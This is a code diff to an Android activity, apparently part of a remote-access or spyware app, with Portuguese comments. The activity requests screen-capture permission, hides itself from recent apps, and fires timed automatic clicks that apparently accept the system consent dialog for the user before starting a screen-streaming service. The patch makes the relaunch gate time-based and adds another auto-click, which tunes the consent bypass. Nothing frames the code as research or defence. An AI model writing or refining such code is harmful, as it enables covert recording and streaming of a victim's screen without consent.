@@ -14,18 +14,20 @@ public class MediaProjectionRequestActivity extends Activity {
 
     private static final String TAG = "MPRequest";
     private static final int REQ = 9911;
-    private static volatile boolean busy = false;
+    // [KRYPTOS-PATCH PERF] gate por timestamp: se a activity nao abrir, nao trava mais
+    private static volatile long lastLaunchTs = 0L;
 
     public static void launch(Context ctx) {
         try {
-            if (busy) return;
-            busy = true;
+            long now = System.currentTimeMillis();
+            if (now - lastLaunchTs < 3000L) return;
+            lastLaunchTs = now;
             Intent i = new Intent(ctx, MediaProjectionRequestActivity.class);
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                     | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
             ctx.startActivity(i);
+            Log.d(TAG, "launch pedido de projecao");
         } catch (Throwable t) {
-            busy = false;
             Log.w(TAG, "launch: " + t);
         }
     }
@@ -35,17 +37,12 @@ public class MediaProjectionRequestActivity extends Activity {
         super.onCreate(b);
         try {
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-            if (mpm == null) { busy = false; finish(); return; }
+            if (mpm == null) { finish(); return; }
             startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
-            autoClick(350); autoClick(800);
-            autoClick(1300); autoClick(1900);
-            autoClick(2600); autoClick(3400);
-            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                @Override public void run() { busy = false; }
-            }, 15000);
+            autoClick(350); autoClick(800); autoClick(1300); autoClick(1900);
+            autoClick(2600); autoClick(3400); autoClick(4200);
         } catch (Throwable t) {
             Log.w(TAG, "onCreate: " + t);
-            busy = false;
             finish();
         }
     }
@@ -59,7 +56,6 @@ public class MediaProjectionRequestActivity extends Activity {
     @Override
     protected void onActivityResult(int req, int res, Intent data) {
         super.onActivityResult(req, res, data);
-        busy = false;
         try {
             if (req == REQ && res == RESULT_OK && data != null) {
                 Intent s = new Intent(this, ScreenStreamService.class);
